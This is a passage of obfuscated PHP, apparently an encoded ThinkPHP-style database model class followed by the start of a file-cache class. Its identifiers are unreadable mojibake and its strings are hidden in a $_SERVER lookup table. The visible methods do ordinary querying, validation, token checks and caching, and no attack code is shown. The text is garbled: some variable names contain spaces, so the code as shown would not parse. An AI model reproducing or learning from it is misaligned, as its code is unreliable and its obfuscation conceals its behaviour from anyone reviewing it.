$Ï¸ºŠ³Œ = '') { $Ãˆæ¢ÉÑ =& $_SERVER[Ü©»’·]; if ($Ï¸ºŠ³Œ) { if (is_callable($Ï¸ºŠ³Œ)) { return call_user_func($Ï¸ºŠ³Œ, $ÌÈ½Ëƒ’); } switch (strtolower($Ï¸ºŠ³Œ)) { case $Ãˆæ¢ÉÑ[294]: return json_encode($ÌÈ½Ëƒ’); case $Ãˆæ¢ÉÑ[295]: return xml_encode($ÌÈ½Ëƒ’); } } return $ÌÈ½Ëƒ’; } public function parseFieldsMap($½ºí ¿Š, $‚†˜§û— = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Õîò¹ºÑ => $äÔ™åÙ) { if ($‚†˜§û— == 1) { if (isset($½ºí ¿Š[$äÔ™åÙ])) { $½ºí ¿Š[$Õîò¹ºÑ] = $½ºí ¿Š[$äÔ™åÙ]; unset($½ºí ¿Š[$äÔ™åÙ]); } } else { if (isset($½ºí ¿Š[$Õîò¹ºÑ])) { $½ºí ¿Š[$äÔ™åÙ] = $½ºí ¿Š[$Õîò¹ºÑ]; unset($½ºí ¿Š[$Õîò¹ºÑ]); } } } } return $½ºí ¿Š; } public function setField($üë±Øõ®, $÷ƒìÈ± = '') { if (is_array($üë±Øõ®)) { $ÙîÍÈ¾‰ = $üë±Øõ®; } else { $ÙîÍÈ¾‰[$üë±Øõ®] = $÷ƒìÈ±; } return $this->save($ÙîÍÈ¾‰); } public function setAdd($áó×éŞ–, $Éæ¾ÖõÎ = 1) { $À§Ş¿Î =& $_SERVER[Ü©»’·]; $Ø¡¸©±² = $áó×éŞ– . $À§Ş¿Î[296] . $Éæ¾ÖõÎ; if ($Éæ¾ÖõÎ < 0) { $Ø¡¸©±² = $áó×éŞ– . $Éæ¾ÖõÎ; } return $this->setField($áó×éŞ–, array($À§Ş¿Î[297], $Ø¡¸©±²)); } public function getField($çø…Ó§¤, $Œß´—Ö = null) { $»Ûãä— =& $_SERVER[Ü©»’·]; $â™åò‡¸[$»Ûãä—[273]] = $çø…Ó§¤; $â™åò‡¸ = $this->_parseOptions($â™åò‡¸); $çø…Ó§¤ = trim($çø…Ó§¤); if (strpos($çø…Ó§¤, $»Ûãä—[50])) { if (!isset($â™åò‡¸[$»Ûãä—[292]])) { $â™åò‡¸[$»Ûãä—[292]] = is_numeric($Œß´—Ö) ? $Œß´—Ö : $»Ûãä—[12]; } $“ÂÚğ‹ = $this->db->select($â™åò‡¸); if (!empty($“ÂÚğ‹)) { $ŒÛì–•¨ = explode($»Ûãä—[50], $çø…Ó§¤); $çø…Ó§¤ = array_keys($“ÂÚğ‹[0]); $ª‹şÑï = array_shift($çø…Ó§¤); $‹ÚÂ€ = array_shift($çø…Ó§¤); $‰Ñ¢Ñâï = array(); $±ÈöÎÀı = count($ŒÛì–•¨); foreach ($“ÂÚğ‹ as $¯ÈÅß”—) { $È‡ššÒ = $¯ÈÅß”—[$ª‹şÑï]; if (2 == $±ÈöÎÀı) { $‰Ñ¢Ñâï[$È‡ššÒ] = $¯ÈÅß”—[$‹ÚÂ€]; } else { $‰Ñ¢Ñâï[$È‡ššÒ] = is_string($Œß´—Ö) ? implode($Œß´—Ö, $¯ÈÅß”—) : $¯ÈÅß”—; } } return $‰Ñ¢Ñâï; } } else { if (!0 !== $Œß´—Ö) { $â™åò‡¸[$»Ûãä—[292]] = is_numeric($Œß´—Ö) ? $Œß´—Ö : 1; } if ($Œß´—Ö === $»Ûãä—[255]) { unset($â™åò‡¸[$»Ûãä—[292]]); } $¯ÈÅß”— = $this->db->select($â™åò‡¸); if (!empty($¯ÈÅß”—)) { if ($Œß´—Ö === $»Ûãä—[255]) { return reset($¯ÈÅß”—[0]); } if (!0 !== $Œß´—Ö && 1 == $â™åò‡¸[$»Ûãä—[292]]) { return reset($¯ÈÅß”—[0]); } foreach ($¯ÈÅß”— as $ÓÓÉ­Ö) { $¢¹Ëñœ[] = $ÓÓÉ­Ö[$çø…Ó§¤]; } return $¢¹Ëñœ; } } return null; } public function create($…èêëìĞ = '', $ıÆßùô = '') { $à•µË‡† =& $_SERVER[Ü©»’·]; if (empty($…èêëìĞ)) { $…èêëìĞ = $_POST; } elseif (is_object($…èêëìĞ)) { $…èêëìĞ = get_object_vars($…èêëìĞ); } if (empty($…èêëìĞ) || !is_array($…èêëìĞ)) { $this->error = think_lang($à•µË‡†[271]); return !1; } $…èêëìĞ = $this->parseFieldsMap($…èêëìĞ, 0); $ıÆßùô = $ıÆßùô ? $ıÆßùô : (!empty($…èêëìĞ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$à•µË‡†[273]])) { $ğ‚Ñ÷ı˜ = $this->options[$à•µË‡†[273]]; unset($this->options[$à•µË‡†[273]]); } elseif ($ıÆßùô == THINK_MODEL_INSERT && isset($this->insertFields)) { $ğ‚Ñ÷ı˜ = $this->insertFields; } elseif ($ıÆßùô == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ğ‚Ñ÷ı˜ = $this->updateFields; } if (isset($ğ‚Ñ÷ı˜)) { if (is_string($ğ‚Ñ÷ı˜)) { $ğ‚Ñ÷ı˜ = explode($à•µË‡†[50], $ğ‚Ñ÷ı˜); } if (think_config($à•µË‡†[298])) { $ğ‚Ñ÷ı˜[] = think_config($à•µË‡†[299]); } foreach ($…èêëìĞ as $À«“ğ => $ÚÁİÅ«) { if (!in_array($À«“ğ, $ğ‚Ñ÷ı˜)) { unset($…èêëìĞ[$À«“ğ]); } } } if (!$this->autoValidation($…èêëìĞ, $ıÆßùô)) { return !1; } if (!$this->autoCheckToken($…èêëìĞ)) { $this->error = think_lang($à•µË‡†[300]); return !1; } if ($this->autoCheckFields) { $ğ‚Ñ÷ı˜ = $this->getDbFields(); foreach ($…èêëìĞ as $À«“ğ => $ÚÁİÅ«) { if (!in_array($À«“ğ, $ğ‚Ñ÷ı˜)) { unset($…èêëìĞ[$À«“ğ]); } elseif (MAGIC_QUOTES_GPC && is_string($ÚÁİÅ«)) { $…èêëìĞ[$À«“ğ] = stripslashes($ÚÁİÅ«); } } } $this->autoOperation($…èêëìĞ, $ıÆßùô); $this->data = $…èêëìĞ; return $…èêëìĞ; } public function autoCheckToken($Å–Ë³¶) { $ÍñÍÔ‚Î =& $_SERVER[Ü©»’·]; if (isset($this->options[$ÍñÍÔ‚Î[301]]) && !$this->options[$ÍñÍÔ‚Î[301]]) { return !0; } if (think_config($ÍñÍÔ‚Î[298])) { $ø‘à¨—Œ = think_config($ÍñÍÔ‚Î[299]); if (!isset($Å–Ë³¶[$ø‘à¨—Œ]) || Session::get($ø‘à¨—Œ)) { return !1; } list($£Ø¨Ùß€, $ğ®ÏÃüğ) = explode($ÍñÍÔ‚Î[11], $Å–Ë³¶[$ø‘à¨—Œ]); if ($ğ®ÏÃüğ && Session::get($ø‘à¨—Œ . $ÍñÍÔ‚Î[10] . $£Ø¨Ùß€) === $ğ®ÏÃüğ) { Session::remove($ø‘à¨—Œ . $ÍñÍÔ‚Î[10] . $£Ø¨Ùß€); return !0; } if (think_config($ÍñÍÔ‚Î[302])) { Session::remove($ø‘à¨—Œ . $ÍñÍÔ‚Î[10] . $£Ø¨Ùß€); } return !1; } return !0; } public function regex($Ö™ô¼­, $¹€éÑ²ª) { $ïîê·ÛÅ =& $_SERVER[Ü©»’·]; $«ƒˆŞ“ = array($ïîê·ÛÅ[303] => $ïîê·ÛÅ[304], $ïîê·ÛÅ[305] => $ïîê·ÛÅ[306], $ïîê·ÛÅ[307] => $ïîê·ÛÅ[308], $ïîê·ÛÅ[309] => $ïîê·ÛÅ[310], $ïîê·ÛÅ[311] => $ïîê·ÛÅ[312], $ïîê·ÛÅ[313] => $ïîê·ÛÅ[314], $ïîê·ÛÅ[315] => $ïîê·ÛÅ[316], $ïîê·ÛÅ[290] => $ïîê·ÛÅ[317], $ïîê·ÛÅ[318] => $ïîê·ÛÅ[319]); if (isset($«ƒˆŞ“[strtolower($¹€éÑ²ª)])) { $¹€éÑ²ª = $«ƒˆŞ“[strtolower($¹€éÑ²ª)]; } return preg_match($¹€éÑ²ª, $Ö™ô¼­) === 1; } private function autoOperation(&$®ÜÛ…®ø, $­¶ÆíĞç) { $Ã¡ ğîÎ =& $_SERVER[Ü©»’·]; if (!empty($this->options[$Ã¡ ğîÎ[320]])) { $Ì¨á±ŠØ = $this->options[$Ã¡ ğîÎ[320]]; unset($this->options[$Ã¡ ğîÎ[320]]); } elseif (!empty($this->_auto)) { $Ì¨á±ŠØ = $this->_auto; } if (isset($Ì¨á±ŠØ)) { foreach ($Ì¨á±ŠØ as $—ü“ªË¤) { if (empty($—ü“ªË¤[2])) { $—ü“ªË¤[2] = THINK_MODEL_INSERT; } if ($­¶ÆíĞç == $—ü“ªË¤[2] || $—ü“ªË¤[2] == THINK_MODEL_BOTH) { switch (trim($—ü“ªË¤[3])) { case $Ã¡ ğîÎ[321]: case $Ã¡ ğîÎ[322]: $‹…ó´ ˜ = isset($—ü“ªË¤[4]) ? (array) $—ü“ªË¤[4] : array(); if (isset($®ÜÛ…®ø[$—ü“ªË¤[0]])) { array_unshift($‹…ó´ ˜, $®ÜÛ…®ø[$—ü“ªË¤[0]]); } if ($Ã¡ ğîÎ[321] == $—ü“ªË¤[3]) { $®ÜÛ…®ø[$—ü“ªË¤[0]] = call_user_func_array($—ü“ªË¤[1], $‹…ó´ ˜); } else { $®ÜÛ…®ø[$—ü“ªË¤[0]] = call_user_func_array(array(&$this, $—ü“ªË¤[1]), $‹…ó´ ˜); } break; case $Ã¡ ğîÎ[273]: $®ÜÛ…®ø[$—ü“ªË¤[0]] = $®ÜÛ…®ø[$—ü“ªË¤[1]]; break; case $Ã¡ ğîÎ[323]: if ($Ã¡ ğîÎ[12] === $®ÜÛ…®ø[$—ü“ªË¤[0]]) { unset($®ÜÛ…®ø[$—ü“ªË¤[0]]); } break; case $Ã¡ ğîÎ[324]: default: $®ÜÛ…®ø[$—ü“ªË¤[0]] = $—ü“ªË¤[1]; } if (!1 === $®ÜÛ…®ø[$—ü“ªË¤[0]]) { unset($®ÜÛ…®ø[$—ü“ªË¤[0]]); } } } } return $®ÜÛ…®ø; } protected function autoValidation($¿ÎË«ºõ, $åªòˆÅ—) { $‘øĞöˆ =& $_SERVER[Ü©»’·]; if (!empty($this->options[$‘øĞöˆ[325]])) { $»ÎˆûÕô = $this->options[$‘øĞöˆ[325]]; unset($this->options[$‘øĞöˆ[325]]); } elseif (!empty($this->_validate)) { $»ÎˆûÕô = $this->_validate; } if (isset($»ÎˆûÕô)) { if ($this->patchValidate) { $this->error = array(); } foreach ($»ÎˆûÕô as $‰éÌÒµê => $¼í´Ö‰á) { if (empty($¼í´Ö‰á[5]) || $¼í´Ö‰á[5] == THINK_MODEL_BOTH || $¼í´Ö‰á[5] == $åªòˆÅ—) { if (0 == strpos($¼í´Ö‰á[2], $‘øĞöˆ[326]) && strpos($¼í´Ö‰á[2], $‘øĞöˆ[327])) { $¼í´Ö‰á[2] = think_lang(substr($¼í´Ö‰á[2], 2, -1)); } $¼í´Ö‰á[3] = isset($¼í´Ö‰á[3]) ? $¼í´Ö‰á[3] : THINK_EXISTS_VALIDATE; $¼í´Ö‰á[4] = isset($¼í´Ö‰á[4]) ? $¼í´Ö‰á[4] : $‘øĞöˆ[328]; switch ($¼í´Ö‰á[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¿ÎË«ºõ, $¼í´Ö‰á)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‘øĞöˆ[12] != trim($¿ÎË«ºõ[$¼í´Ö‰á[0]])) { if (!1 === $this->_validationField($¿ÎË«ºõ, $¼í´Ö‰á)) { return !1; } } break; default: if (isset($¿ÎË«ºõ[$¼í´Ö‰á[0]])) { if (!1 === $this->_validationField($¿ÎË«ºõ, $¼í´Ö‰á)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ış´ç¨‡, $¨ÁïÎ÷›) { if (!1 === $this->_validationFieldItem($ış´ç¨‡, $¨ÁïÎ÷›)) { if ($this->patchValidate) { $this->error[$¨ÁïÎ÷›[0]] = $¨ÁïÎ÷›[2]; } else { $this->error = $¨ÁïÎ÷›[2]; return !1; } } return; } protected function _validationFieldItem($ËÈòè×Ä, $Ø×ìÓëò) { $Çœ·ôáê =& $_SERVER[Ü©»’·]; switch (strtolower(trim($Ø×ìÓëò[4]))) { case $Çœ·ôáê[321]: case $Çœ·ôáê[322]: $Ë‰È•¿È = isset($Ø×ìÓëò[6]) ? (array) $Ø×ìÓëò[6] : array(); if (is_string($Ø×ìÓëò[0]) && strpos($Ø×ìÓëò[0], $Çœ·ôáê[50])) { $Ø×ìÓëò[0] = explode($Çœ·ôáê[50], $Ø×ìÓëò[0]); } if (is_array($Ø×ìÓëò[0])) { foreach ($Ø×ìÓëò[0] as $è¾“¸·) { $¤åòìÕ‰[$è¾“¸·] = $ËÈòè×Ä[$è¾“¸·]; } array_unshift($Ë‰È•¿È, $¤åòìÕ‰); } else { array_unshift($Ë‰È•¿È, $ËÈòè×Ä[$Ø×ìÓëò[0]]); } if ($Çœ·ôáê[321] == $Ø×ìÓëò[4]) { return call_user_func_array($Ø×ìÓëò[1], $Ë‰È•¿È); } else { return call_user_func_array(array(&$this, $Ø×ìÓëò[1]), $Ë‰È•¿È); } case $Çœ·ôáê[329]: return $ËÈòè×Ä[$Ø×ìÓëò[0]] == $ËÈòè×Ä[$Ø×ìÓëò[1]]; case $Çœ·ôáê[330]: if (is_string($Ø×ìÓëò[0]) && strpos($Ø×ìÓëò[0], $Çœ·ôáê[50])) { $Ø×ìÓëò[0] = explode($Çœ·ôáê[50], $Ø×ìÓëò[0]); } $ûÌŠğÂ = array(); if (is_array($Ø×ìÓëò[0])) { foreach ($Ø×ìÓëò[0] as $è¾“¸·) { $ûÌŠğÂ[$è¾“¸·] = $ËÈòè×Ä[$è¾“¸·]; } } else { $ûÌŠğÂ[$Ø×ìÓëò[0]] = $ËÈòè×Ä[$Ø×ìÓëò[0]]; } if (!empty($ËÈòè×Ä[$this->getPk()])) { $ûÌŠğÂ[$this->getPk()] = array($Çœ·ôáê[331], $ËÈòè×Ä[$this->getPk()]); } if ($this->where($ûÌŠğÂ)->find()) { return !1; } return !0; default: return $this->check($ËÈòè×Ä[$Ø×ìÓëò[0]], $Ø×ìÓëò[1], $Ø×ìÓëò[4]); } } public function check($ÓÖÆé´Ù, $á“ù§”Ü, $íä˜ÉßÇ = "\162\x65\x67\x65\x78") { $÷§Îê”œ =& $_SERVER[Ü©»’·]; $íä˜ÉßÇ = strtolower(trim($íä˜ÉßÇ)); switch ($íä˜ÉßÇ) { case $÷§Îê”œ[7]: case $÷§Îê”œ[332]: $ï¨¥Äº = is_array($á“ù§”Ü) ? $á“ù§”Ü : explode($÷§Îê”œ[50], $á“ù§”Ü); return $íä˜ÉßÇ == $÷§Îê”œ[7] ? in_array($ÓÖÆé´Ù, $ï¨¥Äº) : !in_array($ÓÖÆé´Ù, $ï¨¥Äº); case $÷§Îê”œ[333]: case $÷§Îê”œ[334]: if (is_array($á“ù§”Ü)) { $¼ÀÑ¯´ş = $á“ù§”Ü[0]; $À±Ï£‚ = $á“ù§”Ü[1]; } else { list($¼ÀÑ¯´ş, $À±Ï£‚) = explode($÷§Îê”œ[50], $á“ù§”Ü); } return $íä˜ÉßÇ == $÷§Îê”œ[333] ? $ÓÖÆé´Ù >= $¼ÀÑ¯´ş && $ÓÖÆé´Ù <= $À±Ï£‚ : $ÓÖÆé´Ù < $¼ÀÑ¯´ş || $ÓÖÆé´Ù > $À±Ï£‚; case $÷§Îê”œ[335]: case $÷§Îê”œ[336]: return $íä˜ÉßÇ == $÷§Îê”œ[335] ? $ÓÖÆé´Ù == $á“ù§”Ü : $ÓÖÆé´Ù != $á“ù§”Ü; case $÷§Îê”œ[337]: $‘ÇŒÌÂ = mb_strlen($ÓÖÆé´Ù, $÷§Îê”œ[338]); if (strpos($á“ù§”Ü, $÷§Îê”œ[50])) { list($¼ÀÑ¯´ş, $À±Ï£‚) = explode($÷§Îê”œ[50], $á“ù§”Ü); return $‘ÇŒÌÂ >= $¼ÀÑ¯´ş && $‘ÇŒÌÂ <= $À±Ï£‚; } else { return $‘ÇŒÌÂ == $á“ù§”Ü; } case $÷§Îê”œ[339]: list($ŞË¿Ï¾’, $¯ıõàŒË) = explode($÷§Îê”œ[50], $á“ù§”Ü); if (!is_numeric($ŞË¿Ï¾’)) { $ŞË¿Ï¾’ = strtotime($ŞË¿Ï¾’); } if (!is_numeric($¯ıõàŒË)) { $¯ıõàŒË = strtotime($¯ıõàŒË); } return NOW_TIME >= $ŞË¿Ï¾’ && NOW_TIME <= $¯ıõàŒË; case $÷§Îê”œ[340]: return in_array(get_client_ip(), explode($÷§Îê”œ[50], $á“ù§”Ü)); case $÷§Îê”œ[341]: return !in_array(get_client_ip(), explode($÷§Îê”œ[50], $á“ù§”Ü)); case $÷§Îê”œ[328]: default: return $this->regex($ÓÖÆé´Ù, $á“ù§”Ü); } } public function query($Ò¤ã´ƒô, $µùÇà² = false) { $›ö» ÀŒ =& $_SERVER[Ü©»’·]; if (!is_bool($µùÇà²) && !is_array($µùÇà²)) { $µùÇà² = func_get_args(); array_shift($µùÇà²); } $Ò¤ã´ƒô = str_replace(array($›ö» ÀŒ[231], $›ö» ÀŒ[342]), $›ö» ÀŒ[53], $Ò¤ã´ƒô); $Ò¤ã´ƒô = $this->parseSql($Ò¤ã´ƒô, $µùÇà²); return $this->db->query($Ò¤ã´ƒô); } public function execute($Úü³Ä†ñ, $ö‘ìÅš = false) { if (!is_bool($ö‘ìÅš) && !is_array($ö‘ìÅš)) { $ö‘ìÅš = func_get_args(); array_shift($ö‘ìÅš); } $Úü³Ä†ñ = $this->parseSql($Úü³Ä†ñ, $ö‘ìÅš); return $this->db->execute($Úü³Ä†ñ); } protected function parseSql($´°, $Æ ºâ£ö) { $ƒ‡ö´ñ =& $_SERVER[Ü©»’·]; if (!0 === $Æ ºâ£ö) { $¶Æ½ü® = $this->_parseOptions(); $´° = $this->db->parseSql($´°, $¶Æ½ü®); } elseif (is_array($Æ ºâ£ö)) { $Æ ºâ£ö = array_map(array($this->db, $ƒ‡ö´ñ[343]), $Æ ºâ£ö); $´° = vsprintf($´°, $Æ ºâ£ö); } else { $´° = strtr($´°, array($ƒ‡ö´ñ[344] => $this->getTableName(), $ƒ‡ö´ñ[345] => think_config($ƒ‡ö´ñ[244]))); } $this->db->setModel($this->name); return $´°; } public function db($œÍÆµöÓ = '', $¢Ñ–óÔ = '', $¯ö½€Å = array()) { $²Œº»º =& $_SERVER[Ü©»’·]; if ($²Œº»º[12] === $œÍÆµöÓ && $this->db) { return $this->db; } static $ã©æè¶ = array(); static $óèõ¸°³ = array(); if (!isset($óèõ¸°³[$œÍÆµöÓ]) || isset($óèõ¸°³[$œÍÆµöÓ]) && $¢Ñ–óÔ && $ã©æè¶[$œÍÆµöÓ] != $¢Ñ–óÔ) { if (!empty($¢Ñ–óÔ) && is_string($¢Ñ–óÔ) && !1 === strpos($¢Ñ–óÔ, $²Œº»º[8])) { $¢Ñ–óÔ = think_config($¢Ñ–óÔ); } $œÍÆµöÓ = think_guid($¢Ñ–óÔ); $óèõ¸°³[$œÍÆµöÓ] = Db::getInstance($¢Ñ–óÔ); } elseif (NULL === $¢Ñ–óÔ) { $óèõ¸°³[$œÍÆµöÓ]->close(); unset($óèõ¸°³[$œÍÆµöÓ]); return; } if (!empty($¯ö½€Å)) { if (is_string($¯ö½€Å)) { parse_str($¯ö½€Å, $¯ö½€Å); } foreach ($¯ö½€Å as $Æ©…¥âÒ => $¨‰¾Ïœ¸) { $this->setProperty($Æ©…¥âÒ, $¨‰¾Ïœ¸); } } $ã©æè¶[$œÍÆµöÓ] = $¢Ñ–óÔ; $this->db = $óèõ¸°³[$œÍÆµöÓ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Óó“ëª³ = get_class($this); if ($Óó“ëª³ == $_SERVER[Ü©»’·][346]) { return $this->name; } $this->name = substr($Óó“ëª³, 0, -5); } return $this->name; } public function getTableName() { $™¹¾¶æŞ =& $_SERVER[Ü©»’·]; if (empty($this->trueTableName)) { $£¶±Ê‰ç = !empty($this->tablePrefix) ? $this->tablePrefix : $™¹¾¶æŞ[12]; if (!empty($this->tableName)) { $£¶±Ê‰ç .= $this->tableName; } else { $£¶±Ê‰ç .= think_parse_name($this->name); } $this->trueTableName = strtolower($£¶±Ê‰ç); } return (!empty($this->dbName) ? $this->dbName . $™¹¾¶æŞ[10] : $™¹¾¶æŞ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ï»†Ûï =& $_SERVER[Ü©»’·]; return isset($this->fields[$ï»†Ûï[251]]) ? $this->fields[$ï»†Ûï[251]] : $this->pk; } public function getDbFields() { $©ò¿µ÷ =& $_SERVER[Ü©»’·]; if (isset($this->options[$©ò¿µ÷[279]])) { $šõ÷ÇŠ = $this->db->getFields($this->options[$©ò¿µ÷[279]]); return $šõ÷ÇŠ ? array_keys($šõ÷ÇŠ) : !1; } if ($this->fields) { $šõ÷ÇŠ = $this->fields; unset($šõ÷ÇŠ[$©ò¿µ÷[250]], $šõ÷ÇŠ[$©ò¿µ÷[251]], $šõ÷ÇŠ[$©ò¿µ÷[252]], $šõ÷ÇŠ[$©ò¿µ÷[249]]); return $šõ÷ÇŠ; } return !1; } public function data($š¡³Àˆ‹ = '') { $¼¯°ÎæÇ =& $_SERVER[Ü©»’·]; if ($¼¯°ÎæÇ[12] === $š¡³Àˆ‹ && !empty($this->data)) { return $this->data; } if (is_object($š¡³Àˆ‹)) { $š¡³Àˆ‹ = get_object_vars($š¡³Àˆ‹); } elseif (is_string($š¡³Àˆ‹)) { parse_str($š¡³Àˆ‹, $š¡³Àˆ‹); } elseif (!is_array($š¡³Àˆ‹)) { think_exception(think_lang($¼¯°ÎæÇ[271])); } $this->data = $š¡³Àˆ‹; return $this; } public function join($¾ğÕÂè˜) { $°ÇãÏ…° =& $_SERVER[Ü©»’·]; if (is_array($¾ğÕÂè˜)) { $this->options[$°ÇãÏ…°[282]] = $¾ğÕÂè˜; } elseif (!empty($¾ğÕÂè˜)) { $this->options[$°ÇãÏ…°[282]][] = $¾ğÕÂè˜; } return $this; } public function union($”åšÍãß, $¸Úˆ§ƒ« = false) { $’††²äè =& $_SERVER[Ü©»’·]; if (empty($”åšÍãß)) { return $this; } if ($¸Úˆ§ƒ«) { $this->options[$’††²äè[347]][$’††²äè[348]] = !0; } if (is_object($”åšÍãß)) { $”åšÍãß = get_object_vars($”åšÍãß); } if (is_string($”åšÍãß)) { $°°¾’Ñ = $”åšÍãß; } elseif (is_array($”åšÍãß)) { if (isset($”åšÍãß[0])) { $this->options[$’††²äè[347]] = array_merge($this->options[$’††²äè[347]], $”åšÍãß); return $this; } else { $°°¾’Ñ = $”åšÍãß; } } else { think_exception(think_lang($’††²äè[271])); } $this->options[$’††²äè[347]][] = $°°¾’Ñ; return $this; } public function cache($Èé¬¯‚ = true, $å‰â¶€ç = null, $–Ëß¼¿‰ = '') { $øË¿†Óˆ =& $_SERVER[Ü©»’·]; if (!1 !== $Èé¬¯‚) { $this->options[$øË¿†Óˆ[349]] = array($øË¿†Óˆ[94] => $Èé¬¯‚, $øË¿†Óˆ[339] => $å‰â¶€ç, $øË¿†Óˆ[33] => $–Ëß¼¿‰); } return $this; } public function field($Š‰Û¦Ôó, $—Ñ ôÍ = false) { $—¿òŞšÛ =& $_SERVER[Ü©»’·]; if (!0 === $Š‰Û¦Ôó) { $§ìøü¦· = $this->getDbFields(); $Š‰Û¦Ôó = $§ìøü¦· ? $§ìøü¦· : $—¿òŞšÛ[188]; } elseif ($—Ñ ôÍ) { if (is_string($Š‰Û¦Ôó)) { $Š‰Û¦Ôó = explode($—¿òŞšÛ[50], $Š‰Û¦Ôó); } $§ìøü¦· = $this->getDbFields(); $Š‰Û¦Ôó = $§ìøü¦· ? array_diff($§ìøü¦·, $Š‰Û¦Ôó) : $Š‰Û¦Ôó; } $this->options[$—¿òŞšÛ[273]] = $Š‰Û¦Ôó; return $this; } public function scope($ĞÇ±Éë‚ = '', $Ìç§Í = NULL) { $Œ‘‚•í„ =& $_SERVER[Ü©»’·]; if ($Œ‘‚•í„[12] === $ĞÇ±Éë‚) { if (isset($this->_scope[$Œ‘‚•í„[37]])) { $Ä‡«•Ş‚ = $this->_scope[$Œ‘‚•í„[37]]; } else { return $this; } } elseif (is_string($ĞÇ±Éë‚)) { $»ÓŞéëÛ = explode($Œ‘‚•í„[50], $ĞÇ±Éë‚); $Ä‡«•Ş‚ = array(); foreach ($»ÓŞéëÛ as $¯ß²äæç) { if (!isset($this->_scope[$¯ß²äæç])) { continue; } $Ä‡«•Ş‚ = array_merge($Ä‡«•Ş‚, $this->_scope[$¯ß²äæç]); } if (!empty($Ìç§Í) && is_array($Ìç§Í)) { $Ä‡«•Ş‚ = array_merge($Ä‡«•Ş‚, $Ìç§Í); } } elseif (is_array($ĞÇ±Éë‚)) { $Ä‡«•Ş‚ = $ĞÇ±Éë‚; } if (is_array($Ä‡«•Ş‚) && !empty($Ä‡«•Ş‚)) { $this->options = array_merge($this->options, array_change_key_case($Ä‡«•Ş‚)); } return $this; } public function where($Âğ‡æÎ, $ÀËğüª¾ = null) { $«™öîìÅ =& $_SERVER[Ü©»’·]; if (!is_null($ÀËğüª¾) && is_string($Âğ‡æÎ)) { if (!is_array($ÀËğüª¾)) { $ÀËğüª¾ = func_get_args(); array_shift($ÀËğüª¾); } $ÀËğüª¾ = array_map(array($this->db, $«™öîìÅ[343]), $ÀËğüª¾); $Âğ‡æÎ = vsprintf($Âğ‡æÎ, $ÀËğüª¾); } elseif (is_object($Âğ‡æÎ)) { $Âğ‡æÎ = get_object_vars($Âğ‡æÎ); } elseif (is_array($Âğ‡æÎ)) { foreach ($Âğ‡æÎ as $ù¦äÂ¾‡ => $í¹¥û×ä) { if ((is_numeric($ù¦äÂ¾‡) || !$ù¦äÂ¾‡) && is_string($í¹¥û×ä)) { if (strpos($í¹¥û×ä, $«™öîìÅ[350]) === 0) { continue; } think_trace($«™öîìÅ[351], $«™öîìÅ[12], $«™öîìÅ[49]); die; } } } if (is_string($Âğ‡æÎ) && $«™öîìÅ[12] != $Âğ‡æÎ) { $ƒŞµ—Ìö = array(); $ƒŞµ—Ìö[$«™öîìÅ[352]] = $Âğ‡æÎ; $Âğ‡æÎ = $ƒŞµ—Ìö; } if (isset($this->options[$«™öîìÅ[275]])) { $this->options[$«™öîìÅ[275]] = array_merge($this->options[$«™öîìÅ[275]], $Âğ‡æÎ); } else { $this->options[$«™öîìÅ[275]] = $Âğ‡æÎ; } return $this; } public function limit($™û–ŒÉŠ, $›Ÿ­‚·º = null) { $ÚÒĞ«ü¢ =& $_SERVER[Ü©»’·]; $this->options[$ÚÒĞ«ü¢[292]] = is_null($›Ÿ­‚·º) ? $™û–ŒÉŠ : $™û–ŒÉŠ . $ÚÒĞ«ü¢[50] . $›Ÿ­‚·º; return $this; } public function page($ˆÜ¥ı ¹, $ÅˆºËÅè = null) { $´¥Ì¾ÊÛ =& $_SERVER[Ü©»’·]; $this->options[$´¥Ì¾ÊÛ[353]] = is_null($ÅˆºËÅè) ? $ˆÜ¥ı ¹ : $ˆÜ¥ı ¹ . $´¥Ì¾ÊÛ[50] . $ÅˆºËÅè; return $this; } public function comment($‘Åûº¨˜) { $this->options[$_SERVER[Ü©»’·][354]] = $‘Åûº¨˜; return $this; } public function setProperty($á—ô›øó, $ë¾—–ü±) { if (property_exists($this, $á—ô›øó)) { $this->{$á—ô›øó} = $ë¾—–ü±; } return $this; } } $_file = $_SERVER[$_SERVER[Ü©»’·][355]]; $_size = $_SERVER[Ü©»’·][356]; goto dÑÀ³†™; böËÛ…ì: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¡Î£Û, $ÛÇ­²­—) { $Óô•¥û« =& $_SERVER[Ü©»’·]; $this->cachePath = $¡Î£Û[$Óô•¥û«[84]]; $this->prefix = $Óô•¥û«[840]; $this->cacheTime = $ÛÇ­²­—; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($†Ì¤„ëï) { $ß•¤—ÎŸ =& $_SERVER[Ü©»’·]; $†Ì¤„ëï = str_replace(array($ß•¤—ÎŸ[841], $ß•¤—ÎŸ[97], $ß•¤—ÎŸ[73]), $ß•¤—ÎŸ[842], $†Ì¤„ëï); return $this->cachePath . $ß•¤—ÎŸ[843] . $†Ì¤„ëï . $ß•¤—ÎŸ[844]; } public function set($·§¤Ë, $¤•‡“æ”, $”‹ÈÊµÑ = false) { $”‹ÈÊµÑ = $”‹ÈÊµÑ ? $”‹ÈÊµÑ : $this->cacheTime; $¶Âªô•ƒ = $this->getFile($·§¤Ë); if (file_put_contents($¶Âªô•ƒ, $this->prefix . $¤•‡“æ”, LOCK_EX)) { @touch($¶Âªô•ƒ, intval(time() + $”‹ÈÊµÑ)); clearstatcache(); return !0; } @unlink($¶Âªô•ƒ); return !1; } public function get($ıÑ„”î) { $…´æ¯ñî = $this->getFile($ıÑ„”î); if (file_exists($…´æ¯ñî) && filemtime($…´æ¯ñî) < time()) { 